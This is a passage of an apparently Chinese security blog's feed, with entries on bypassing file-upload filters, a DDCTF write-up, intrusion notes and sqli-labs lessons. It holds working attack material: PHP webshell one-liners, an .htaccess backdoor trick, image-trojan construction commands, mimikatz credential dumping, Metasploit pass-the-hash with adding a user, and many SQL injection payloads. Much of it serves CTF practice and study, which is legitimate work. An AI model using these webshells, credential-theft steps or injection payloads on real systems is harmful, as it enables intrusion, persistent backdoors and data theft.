        &lt;h1 id=&quot;php文件包含漏洞&quot;&gt;&lt;a href=&quot;#php文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;php文件包含漏洞&quot;&gt;&lt;/a&gt;php文件包含漏洞&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="Web安全" scheme="http://0xmj.club/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件包含" scheme="http://0xmj.club/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>文件上传总结</title>
    <link href="http://0xmj.club/2018/04/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/"/>
    <id>http://0xmj.club/2018/04/23/文件上传总结/</id>
    <published>2018-04-23T13:39:03.000Z</published>
    <updated>2018-04-23T14:06:21.412Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传总结"><a href="#文件上传总结" class="headerlink" title="文件上传总结"></a>文件上传总结</h1><h2 id="0x00-上传检测流程概述"><a href="#0x00-上传检测流程概述" class="headerlink" title="0x00 上传检测流程概述"></a>0x00 上传检测流程概述</h2><p>一个文件以http协议上传的时候，将以post请求发送至web服务器。服务器接受并同意后，用户与web服务器建立连接，并且传输数据而一般文件上传过程中检测部分由</p><ul><li>A 客户端javascript检测 （检测文件扩展名）</li><li>B 服务端MIME类型检测 （检测Content—Type）</li><li>C 服务端目录路径检测（检测和path相关参数）</li><li>D 服务端文件扩展名检测 （检测文件扩展名）</li><li>E 服务端内容检测 （检测是否含有恶意代码）0x01 客户端检测绕过(javascript 检测)</li></ul><h2 id="0x01-客户端检测绕过检测-（js检测）"><a href="#0x01-客户端检测绕过检测-（js检测）" class="headerlink" title="0x01 客户端检测绕过检测 （js检测）"></a>0x01 客户端检测绕过检测 （js检测）</h2><h2 id="0x02-服务端检测绕过-MIME-类型检测"><a href="#0x02-服务端检测绕过-MIME-类型检测" class="headerlink" title="0x02 服务端检测绕过(MIME 类型检测)"></a>0x02 服务端检测绕过(MIME 类型检测)</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201804071824_866.png" alt=""></p><h2 id="0x03-服务端检测绕过-目录路径检测"><a href="#0x03-服务端检测绕过-目录路径检测" class="headerlink" title="0x03 服务端检测绕过(目录路径检测)"></a>0x03 服务端检测绕过(目录路径检测)</h2><h2 id="0x04-服务端检测绕过-文件扩展名检测"><a href="#0x04-服务端检测绕过-文件扩展名检测" class="headerlink" title="0x04 服务端检测绕过(文件扩展名检测)"></a>0x04 服务端检测绕过(文件扩展名检测)</h2><ul><li><p>黑名单检测</p><ol><li><p>文件名大小写绕过<br>用像 AsP，pHp 之类的文件名绕过黑名单检测</p></li><li><p>名单列表绕过<br>用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类.还有php2、php3、</p></li><li><p>特殊文件名绕过<br>比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式<br>在 windows是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会<br>被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性。</p></li><li><p>0x00 截断绕过<br>假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00) 而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg<br>​</p></li><li><p>.htaccess 文件攻击<br>配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测</p><p>该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。该文件的写法如下：</p><pre><code>&lt;FilesMatch &quot;_php.gif&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有”_php.gif”字符串的，统一按照php文件来执行。该文件在Apache里默认是启用的，如果没启用，启用方法见：<a href="http://www.jb51.net/article/25476.htm" target="_blank" rel="external">http://www.jb51.net/article/25476.htm</a> 然后就可以上传一个带一句话木马的文件，例如a_php.gif，会被当成php执行。该方法其实不是漏洞，是Apache的特性。该方法常用于黑客入侵网站之后，不想被发现，留一个隐蔽的后门。在PHP手册中提到一句话，move_uploaded_file section,there is awarning which states‘If the destination file already exists, it will be overwritten.’服务器端如果采用了黑名单的形式限制上传，但是黑名单中却没有.htaccess文件，那么我们可以上传.htaccess文件覆盖掉原来的文件。</p></li><li><p>解析调用/漏洞绕过<br>这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞</p></li></ol></li><li><p>白名单检测</p></li><li><p>.htaccess 文件攻击</p></li></ul><h2 id="0x05-服务端检测绕过-文件内容检测"><a href="#0x05-服务端检测绕过-文件内容检测" class="headerlink" title="0x05 服务端检测绕过(文件内容检测)"></a>0x05 服务端检测绕过(文件内容检测)</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201804071849_233.png" alt=""></p><ul><li><p>文件幻数检测</p><p>JPG ： FF D8 FF E0 00 10 4A 46 49 46<br>GIF ： 47 49 46 38 39 61 (GIF89a)<br>PNG： 89 50 4E 47</p></li><li><p>文件相关信息检测</p><p>图像文件相关信息检测常用的就是 getimagesize()函数</p></li></ul><pre><code>只需要把文件头部分伪造好就 ok GIF89a</code></pre><p>  &lt;?php phpinfo();?&gt;</p><ul><li><p>文件加载检测</p><p>绕过方法：<br>针对渲染加载测试：代码注入绕过<br>针对二次渲染测试：攻击文件加载器</p></li></ul><h2 id="0x06-服务器解析漏洞"><a href="#0x06-服务器解析漏洞" class="headerlink" title="0x06 服务器解析漏洞"></a>0x06 服务器解析漏洞</h2><h3 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h3><ul><li>解析：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</li><li>描述：若一个文件名<code>abc.x1.x2.x3</code>，<code>Apache</code>会从<code>x3</code>开始解析，如果<code>x3</code>不是一个能解析的扩展名，就往前解析<code>x2</code>以此往复，直到能遇到一个能解析的文件名为止</li></ul><h3 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h3><ul><li><p>解析：<code>test.asp/jkl</code>,<code>IIS</code>的某些版本中会直接当成<code>asp</code>来解析;<code>test.asp;jkl</code>,<code>IIS</code>某些版本也会按照<code>asp</code>来解析；<code>任意文件名/任意文件名.php</code>，<code>IIS</code>某些版本会直接当<code>php</code>来解析</p></li><li><p>描述：</p><p>1.<code>IIS6.0</code>在解析<code>asp</code>时有两个解析漏洞，一个是如果任意目录名包含<code>.asp</code>字符串，那么这个目录下的所有文件都会按照<code>asp</code>去解析，另一个是文件名中含有<code>asp;</code>就会优先当作<code>asp</code>来解析</p><p><strong>利用方法有两种</strong>:</p><pre><code>1. 畸形目录解析/xxxx.asp/xxx.jpg2. 分号文件解析test.asp;.jpg</code></pre><ul><li>第1种是因为xxx.jpg图片文件在某个以.asp结尾的目录下面，而被IIS当成可执行文件来解析</li><li>第2种虽然以.jpg结尾，但IIS 解析时忽略了分号”;”后面的部分，当成了test.asp文件来解析</li></ul><p>2.<code>IIS7.0/7.5</code>对php解析有类似<code>Nginx</code>的解析漏洞只要对任意文件名在url后面追加上字符串<code>/任意文件名.php</code>就会按照php去解析</p><p>上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php</p></li></ul><h3 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h3><ul><li><p>解析：</p><ol><li><p>任意文件名/任意文件名.php</p><p>将shell语句，如</p><pre><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></pre><p>写在文本xx.txt中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀），然后用命令将shell语句附加在正常图片xx.jpg后</p><pre><code>copy xx.jpg/b + xx.txt/a test.jpg</code></pre><p>上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php</p></li><li><p>任意文件名%00.php都当作php来解析</p><pre><code>xx.jpg%00.php</code></pre></li></ol></li><li><p>描述：例如原文件名test.jpg但内容包含php一句话添加为test.jpg/x.php来进行解析攻击低版本可以子任意文件名后添加%00.php进行截断攻击</p></li><li><p>对应版本：</p><p>nginx 0.5.* [Success]</p><p>nginx 0.6.* [Success]</p><p>nginx 0.7 &lt;= 0.7.65 [Success]</p><p>nginx 0.8 &lt;= 0.8.37 [Success]</p></li></ul><h2 id="0x07-上传攻击框架"><a href="#0x07-上传攻击框架" class="headerlink" title="0x07 上传攻击框架"></a>0x07 上传攻击框架</h2><ul><li>轻量级检测绕过攻击</li><li>路径/扩展名检测绕过攻击</li><li>文件内容性检测绕过攻击</li><li>上传攻击框架</li></ul><h2 id="文件上传防御"><a href="#文件上传防御" class="headerlink" title="文件上传防御"></a>文件上传防御</h2><p>1.关掉上传文件的功能</p><p>如果Web应用程序不需要上传文件的功能，则可以直接将上传文件的功能关闭来避免不必要的麻烦。打开“php.ini”文件，找到file uploads的位置，将file_uploads设置成Off。<br>2.限制能够上传的文件大小<br>如果黑客采取连续不断地上传文件，或是上传极大的文件，来使Web应用程序没有更多资源来处理其他来访者的请求，黑客就可以借此来瘫痪网站。PHP的限制机制可以让您限制允许上传文件体积的最大值，来避免来访者上传太大的文件。单独POST请求的最大值，可以使用php.ini文件的upload_max_size来设置。打开“php.ini”文件，找到upload_max_size的位置，将upload_max_size设置成想要的值。<br>3.检查上传文件的类型<br>4.检查上传文件的内容<br>5.上传的文件不要保存在公开的文件夹内，以避免被黑客直接读取。另外将文件的路径隐藏起来，或是将文件名称改成没有扩展名的随机文件名，都可以增加上传文件的安全性。</p><h2 id="图片木马制作"><a href="#图片木马制作" class="headerlink" title="图片木马制作"></a>图片木马制作</h2><p>命令：</p><pre><code>copy /b 1.jpg+2.php</code></pre><p>copy 1.jpg/b+lubr.php/a 1lubr.jpg</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件上传总结&quot;&gt;&lt;a href=&quot;#文件上传总结&quot; class=&quot;headerlink&quot; title=&quot;文件上传总结&quot;&gt;&lt;/a&gt;文件上传总结&lt;/h1&gt;&lt;h2 id=&quot;0x00-上传检测流程概述&quot;&gt;&lt;a href=&quot;#0x00-上传检测流程概述&quot; class=&quot;he
      
    
    </summary>
    
      <category term="Web安全" scheme="http://0xmj.club/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件上传" scheme="http://0xmj.club/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF三道小结</title>
    <link href="http://0xmj.club/2018/04/23/DDCTF%E4%B8%89%E9%81%93%E5%B0%8F%E7%BB%93/"/>
    <id>http://0xmj.club/2018/04/23/DDCTF三道小结/</id>
    <published>2018-04-23T13:35:39.000Z</published>
    <updated>2018-04-23T13:36:28.253Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF三道小结"><a href="#DDCTF三道小结" class="headerlink" title="DDCTF三道小结"></a>DDCTF三道小结</h1><p>太菜了 就只能做出三道题，继续加油，明年再战</p><h2 id="╯°□°）╯︵-┻━┻"><a href="#╯°□°）╯︵-┻━┻" class="headerlink" title="(╯°□°）╯︵ ┻━┻"></a>(╯°□°）╯︵ ┻━┻</h2><p>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb7b9b8e4b5b5e4e2b7b6b5b5b2e1b9b2b2e4b0b0e4b7b7b5e5b3b3b1b1b9b0b7fd</p><p>进制转换，先将16进制转换为10进制，再对128求余，剩下的结果转换为字符。</p><pre><code class="python">ascii=&quot;212 232 225 244 160 247 225 243 160 230 225 243 244 161 160 212 232 229 160 230 236 225 231 160 233 243 186 160 196 196 195 212 198 251 185 178 178 225 226 185 185 183 180 225 180 183 227 228 179 178 178 227 230 180 179 226 181 176 182 177 176 230 225 229 225 181 253&quot;newlist=ascii.split()newlist2=ascii.split()for i in range(90,160):    for j in range(len(newlist)):        newlist2[j]=int(newlist[j])-i    for k in newlist2:        print chr(int(k)),    print &quot;&quot;</code></pre><p>​    </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804192226_410.png" alt=""></p><p> DDCTF{922ab9974a47cd322cf43b50610faea5}</p><h2 id="第四扩展FS"><a href="#第四扩展FS" class="headerlink" title="第四扩展FS"></a>第四扩展FS</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201804192234_752.png" alt=""></p><p>分析得到有一个压缩包</p><p>foremost出来得到zip，</p><p>解压密码在windows.jpg属性的备注</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804192236_14.png" alt=""></p><p>Pactera</p><p>（插曲我一开始以为是crc32攻击）逃 </p><p>解压得到file</p><p>根据提示进行字符频度统计即可得到flag。</p><p><a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx" target="_blank" rel="external">http://www.aihanyu.org/cncorpus/CpsTongji.aspx</a></p><table><thead><tr><th>词</th><th>频次</th><th>频率 %</th><th></th></tr></thead><tbody><tr><td>1</td><td>D</td><td>3950</td><td>12.9381</td></tr><tr><td>2</td><td>C</td><td>1900</td><td>6.2234</td></tr><tr><td>3</td><td>T</td><td>1850</td><td>6.0596</td></tr><tr><td>4</td><td>F</td><td>1800</td><td>5.8958</td></tr><tr><td>5</td><td>{</td><td>1750</td><td>5.7321</td></tr><tr><td>6</td><td>t</td><td>1700</td><td>5.5683</td></tr><tr><td>7</td><td>u</td><td>1650</td><td>5.4045</td></tr><tr><td>8</td><td>0</td><td>1600</td><td>5.2407</td></tr><tr><td>9</td><td>k</td><td>1550</td><td>5.077</td></tr><tr><td>10</td><td>U</td><td>1500</td><td>4.9132</td></tr><tr><td>11</td><td>a</td><td>1450</td><td>4.7494</td></tr><tr><td>12</td><td>n</td><td>1400</td><td>4.5857</td></tr><tr><td>13</td><td>s</td><td>1350</td><td>4.4219</td></tr><tr><td>14</td><td>h</td><td>1300</td><td>4.2581</td></tr><tr><td>15</td><td>i</td><td>1250</td><td>4.0943</td></tr><tr><td>16</td><td>y</td><td>1200</td><td>3.9306</td></tr><tr><td>17</td><td>e</td><td>1150</td><td>3.7668</td></tr><tr><td>18</td><td>!</td><td>1100</td><td>3.603</td></tr><tr><td>19</td><td>}</td><td></td></tr></tbody></table><p>DDCTF{tu0kUanshiye!}</p><h2 id="Web-1-数据库的秘密"><a href="#Web-1-数据库的秘密" class="headerlink" title="Web 1 数据库的秘密"></a>Web 1 数据库的秘密</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201804212006_929.png" alt=""></p><p>使用插件modify headers加一个x-forward-for: 123.232.23.245</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804212005_33.png" alt=""></p><p>打开题目是三个搜索框和一个数据表格，分析form表单发现隐藏一处所以更改本地复现进行注入</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804220047_85.png" alt=""></p><p>发现是bool盲注，并用burp fuzz一下</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804220050_110.png" alt=""></p><p>发现union，database（）都被过滤</p><p>准语句：0’&amp;&amp;if(ascii(substr((select version()),1,1))&gt;0,1,0)#</p><p>得到库名：0’ &amp;&amp; if(ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;0,1,0)#：DDCTF</p><p>得到表名0’&amp;&amp;if(ascii(substr((select table_name from information_schema.tables where table_schema=’ddctf’))&gt;0,1,0)#：ctf_key1</p><p>得到字段名 0’&amp;&amp;if(ascii(substr((select column_name from information_schema.columns where table_name=’ctf_key1’ limit 0,1),9,1))&gt;0,1,0)#：secvalue</p><p>得到flag  0’&amp;&amp;if(ascii(substr((select secvalue from ctf_key1 limit 0,1),1,1))&gt;0,1,0)#   ====0’ &amp;&amp; substr((select secvalue from ddctf.ctf_key1 limit 0,1),1,1)=’d’#</p><p>DDCTF{IKIDLHNZMKFUDEQE}</p><blockquote><p><strong>substr()函数</strong></p><p>​    Substr()和substring()函数实现的功能是一样的，均为截取字符串。</p><p>​    string substring(string, start, length)</p><p>​    string substr(string, start, length)</p><p>​    参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</p></blockquote><p>另附大佬一的奇特方法直接显注：</p><p>此waf为假waf 使用超过100个参数可以绕过</p><p><a href="http://www.hayasec.me/2018/04/20/ddctf-web1-writeup/" target="_blank" rel="external">http://www.hayasec.me/2018/04/20/ddctf-web1-writeup/</a></p><p>大佬二sqlmap一把梭：</p><p>对于此题，采用了使用 PHP 编写代理页面的方式，对请求进行了代理并签名。之后使用 sqlmap 等通用工具对该 PHP 页面进行注入即可。<br><code>proxy.php</code> 代码如下：</p><pre><code>&lt;?php@$id = $_REQUEST[&#39;id&#39;];@$title = $_REQUEST[&#39;title&#39;];@$author = $_REQUEST[&#39;author&#39;];@$date = $_REQUEST[&#39;date&#39;];$time = time();$sig = sha1(&#39;id=&#39;.$id.&#39;title=&#39;.$title.&#39;author=&#39;.$author.&#39;date=&#39;.$date.&#39;time=&#39;.$time.&#39;adrefkfweodfsdpiru&#39;);$ch = curl_init();$post = [    &#39;id&#39; =&gt; $id,    &#39;title&#39; =&gt; $title,    &#39;author&#39; =&gt; $author,    &#39;date&#39; =&gt; $date,];curl_setopt($ch, CURLOPT_URL,&quot;http://116.85.43.88:8080/KREKGJVFPYQKERQR/dfe3ia/index.php?sig=$sig&amp;time=$time&quot;);curl_setopt($ch, CURLOPT_HTTPHEADER, array(    &#39;X-Forwarded-For: 123.232.23.245&#39;,    ));curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, $post);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt($ch, CURLOPT_HEADER, true);$ch_out = curl_exec($ch);$ch_info = curl_getinfo($ch);$header = substr($ch_out, 0, $ch_info[&#39;header_size&#39;]);$body = substr($ch_out, $ch_info[&#39;header_size&#39;]);http_response_code($ch_info[&#39;http_code&#39;]);//header($header);//echo $header;echo $body;</code></pre><p>sqlmap 一把梭，对代理 PHP 页面进行注入，注入点果然位于 <code>author</code>，获得 flag。</p><blockquote><p><code>sqlmap.py -u &#39;http://127.0.0.1/proxy.php?author=admin&#39; --dump</code></p></blockquote><p><img src="https://clannad.me/image/web-1.png" alt="Web-1"></p><p><a href="https://clannad.me/ddctf.md.html" target="_blank" rel="external">https://clannad.me/ddctf.md.html</a></p><p><a href="http://sec2hack.com/ctf/ddctf-2018-web-writeup.html" target="_blank" rel="external">http://sec2hack.com/ctf/ddctf-2018-web-writeup.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DDCTF三道小结&quot;&gt;&lt;a href=&quot;#DDCTF三道小结&quot; class=&quot;headerlink&quot; title=&quot;DDCTF三道小结&quot;&gt;&lt;/a&gt;DDCTF三道小结&lt;/h1&gt;&lt;p&gt;太菜了 就只能做出三道题，继续加油，明年再战&lt;/p&gt;
&lt;h2 id=&quot;╯°□°）╯︵
      
    
    </summary>
    
      <category term="CTF" scheme="http://0xmj.club/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://0xmj.club/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>高级入侵</title>
    <link href="http://0xmj.club/2018/04/23/%E9%AB%98%E7%BA%A7%E5%85%A5%E4%BE%B5/"/>
    <id>http://0xmj.club/2018/04/23/高级入侵/</id>
    <published>2018-04-23T13:33:14.000Z</published>
    <updated>2018-04-23T13:36:24.098Z</updated>
    
    <content type="html"><![CDATA[<h1 id="高级入侵"><a href="#高级入侵" class="headerlink" title="高级入侵"></a>高级入侵</h1><h3 id="Windows权限分析与密码安全测试"><a href="#Windows权限分析与密码安全测试" class="headerlink" title="Windows权限分析与密码安全测试"></a>Windows权限分析与密码安全测试</h3><p>1.windows xp写入管理员权限<br>2.windows 2003默认权限<br>—–默认只安装静态HTTP服务器<br>—–增强的文件访问控制<br>—–父目录被禁用<br>—–坚持最小特权原则</p><p>注意给users组只有读取和运行权限</p><p>直接在系统上面运行上面与webshell下运行木马区别<br>在系统上运行木马是系统权限运行，在webshell下运行木马是以当前内置中间件权限运行</p><p>中间件权限<br>1.菜刀进入右键<br>执行<br>whomai<br>得知自身权限<br>2.cd c:\www\<br>3.dir</p><h3 id="本地管理员密码如何直接提取"><a href="#本地管理员密码如何直接提取" class="headerlink" title="本地管理员密码如何直接提取"></a>本地管理员密码如何直接提取</h3><p>1.直接通过mimikatz读取管理员密码（win7 winxp）<br>第一条 ：privilege::debug  //提升权限<br>第二条：sekurlsa::logonpa ssWords //抓取密码</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201801091859_724.png" alt=""></p><p>2.webshell  </p><p>3.<a href="http://www.4hou.com/tools/7404.html" target="_blank" rel="external">Lazagne-master</a></p><p>4.利用hash远程登录系统主要通过msf的<br>exploit/windows/smb/psexec模块来完成<br><img src="http://oy0tigw51.bkt.clouddn.com/201801091927_696.png" alt=""></p><p>use exploit/windows/smb/psexec<br>show option<br>set RHOST 192.168.1.109<br>set SMBUser administrator<br>set SMPass   (根目录下的pass.txt里的哈希值)<br>exploit<br>shell<br>net user<br>net user 123 123 / add</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201801091956_886.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201801091957_230.png" alt=""></p><p>本地哈希破解<br>注意本地搜索sam 这个是目标机里的所有密码</p><p>5.通过LC5暴力破解hash密码<br>使用gmer直接提取sam和sysytem文件或用pwdump7提取HASH 最后使用LC5破解</p><p>6.使用Ophcrack（kali）破解系统hash密码</p><h3 id="获取Webshell方法总结"><a href="#获取Webshell方法总结" class="headerlink" title="获取Webshell方法总结"></a>获取Webshell方法总结</h3><h4 id="主要通过谷歌搜索cms漏洞"><a href="#主要通过谷歌搜索cms漏洞" class="headerlink" title="主要通过谷歌搜索cms漏洞"></a>主要通过谷歌搜索cms漏洞</h4><p>phpcms discuz phpwind</p><h4 id="非cms获取webshell方法"><a href="#非cms获取webshell方法" class="headerlink" title="非cms获取webshell方法"></a>非cms获取webshell方法</h4><p>1.数据库备份获取<br>2.抓包上传获取<br>3.sql命令获取<br>4.模板修改获取<br>5.插入一句话获取<br>6.修改上传类型获取</p><h4 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h4><p>PHPmyadmin获取</p><pre><code>select &#39;&lt;?php echo \&#39;&lt;pre&gt;\&#39;;system($_GET[\&#39;cmd\&#39;]);echo \&#39;&lt;pre&gt;\&#39;;?&gt;&#39; into outfile &#39;E:/xamp/www/xioam.php&#39;</code></pre><p>php爆路径方法收集<br><img src="http://oy0tigw51.bkt.clouddn.com/201801092306_259.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201801092322_426.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201801092325_134.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201801092326_398.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201801092327_366.png" alt=""></p><p>tomcat获取<br>weblogic获取<br>jboss获取</p><h3 id="内网远程连接"><a href="#内网远程连接" class="headerlink" title="内网远程连接"></a>内网远程连接</h3><p>webshell如何开启3389</p><p>服务器端口被修改如何查找</p><p>cmd<br>tasklist /svc 寻找TermService</p><p>netstat -ano<br>查看所有端口</p><p>服务器处于内网如何连接</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;高级入侵&quot;&gt;&lt;a href=&quot;#高级入侵&quot; class=&quot;headerlink&quot; title=&quot;高级入侵&quot;&gt;&lt;/a&gt;高级入侵&lt;/h1&gt;&lt;h3 id=&quot;Windows权限分析与密码安全测试&quot;&gt;&lt;a href=&quot;#Windows权限分析与密码安全测试&quot; class=&quot;
      
    
    </summary>
    
      <category term="渗透" scheme="http://0xmj.club/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="入侵" scheme="http://0xmj.club/tags/%E5%85%A5%E4%BE%B5/"/>
    
  </entry>
  
  <entry>
    <title>信息收集</title>
    <link href="http://0xmj.club/2018/04/02/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://0xmj.club/2018/04/02/信息收集/</id>
    <published>2018-04-02T08:15:51.000Z</published>
    <updated>2018-04-02T08:19:00.725Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="http://oy0tigw51.bkt.clouddn.com/201803241742_133.png" alt=""></p><p>1、robots.txt<br>2、网站备份压缩文件<br>    可能为.rar、zip、.7z、.tar.gz、.bak、.txt、.swp等等，以及和网站信息有关的文件名www.rar、web、rar等等<br>3、Git导致文件泄露<br><img src="http://oy0tigw51.bkt.clouddn.com/201803241744_967.png" alt=""><br>4、DS_store导致文件泄露<br>5、SVN导致文件泄露<br>SVN漏洞在实际渗透测试过程中，利用到也比较多，由于一些开发管理员疏忽造成，原理类似DS_Store漏洞。我们这里不再进行搭建环境，给大家推荐工具，利用方法如下：</p><pre><code>1) 漏洞利用工具： Seay SVN漏洞利用工具2) 添加网站url</code></pre><p>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站<br>6、WEB-INF/web.xml泄露<br>        6.1、环境搭建<br>        6.2、访问页面<br>        6.3、扫描<br>        6.4、验证结果<br>7、Zoomeye搜索引擎使用<br>        7.1、搜索规则<br>        7.2、搜索技巧<br>        7.3、实战搜索<br>8、bing搜索引擎使用<br>9、Fofa搜索<br>10、站长工具<br>        10.1、站长工具Whois<br>        10.2、seo综合查询<br>        10.3、站长工具tool</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;http://oy0tigw51.bkt.clouddn.com/201803241742_133.pn
      
    
    </summary>
    
      <category term="渗透" scheme="http://0xmj.club/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="信息收集" scheme="http://0xmj.club/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs less11-15</title>
    <link href="http://0xmj.club/2018/04/02/sqli-labs-less11-15/"/>
    <id>http://0xmj.club/2018/04/02/sqli-labs-less11-15/</id>
    <published>2018-04-02T08:15:38.000Z</published>
    <updated>2018-04-23T13:25:38.658Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs-less11-15"><a href="#sqli-labs-less11-15" class="headerlink" title="sqli-labs less11-15"></a>sqli-labs less11-15</h1><p>[TOC]</p><h3 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h3><p>uname=1’ or 1=1 # &amp;passwd=x</p><h3 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h3><p>uname=1”) or 1=1 # &amp;passwd=x</p><h3 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h3><p>username：1’<br>Password： （随便输）<br>报错：<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘12’) LIMIT 0,1’ at line 1<br>‘) 我们可以知道程序对 id 进行了 ‘) 的处理。</p><p>uname=1’) or 1=1 # &amp;passwd=x</p><h3 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h3><p>uname=admin”and left(database(),1)&gt;’a’#&amp;passwd=1&amp;submit=Submit</p><p>###less15POST型基于时间盲注<br>uname=admin’and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;passwd=11&amp;submit=Subm<br>it</p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>uname=”) or 1=1#&amp;passwd=x<br>或<br>uname=”) or if(length(database())=8,1,sleep(2))#&amp;passwd=x</p><h3 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h3><p>Username：admin<br>Password：1’ You have an error in your SQL syntax; check the manual that corresponds<br>to your MySQL server version for the right syntax to use near ‘admin’’<br>at line 1<br>可以看到 admin’’ 说明在对密码的处理过程中使用的是 ‘’ 。<br>接下来利用盲注进行注入。<br>这里首先演示一下报错类型的盲注。<br>uname=admin&amp;passwd=1’ and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</p><p>Less-18 Header Injection- Error Based- string<br>在header里的User-Agent后跟上payload：<br>‘ or updatexml(1,concat(0x5e,(select database() ),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select email_id from emails limit 0,1),0x5e),1),”,”)#</p><p>Less-19 Header Injection- Referer- Error Based- string<br>在header里的Referer后跟上payload：<br>‘ or updatexml(1,concat(0x5e,(select database() ),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select column_name from 